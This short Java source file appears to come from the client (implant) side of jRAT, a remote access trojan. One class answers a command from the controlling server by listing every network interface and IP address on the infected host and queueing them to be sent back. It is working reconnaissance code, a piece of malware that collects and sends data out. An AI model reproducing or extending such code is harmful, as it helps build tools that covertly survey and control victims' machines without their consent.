package jrat.client.packets.incoming;

import jrat.client.Connection;
import jrat.client.packets.outgoing.Packet56NetworkAdapter;

import java.net.InetAddress;
import java.net.NetworkInterface;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Enumeration;


public class Packet82NetworkAdapters implements IncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		Enumeration<NetworkInterface> nets = NetworkInterface.getNetworkInterfaces();
		for (NetworkInterface netint : Collections.list(nets)) {
			ArrayList<InetAddress> list = Collections.list(netint.getInetAddresses());

			con.addToSendQueue(new Packet56NetworkAdapter(netint.getDisplayName(), netint.getName(), list));
		}
	}

}
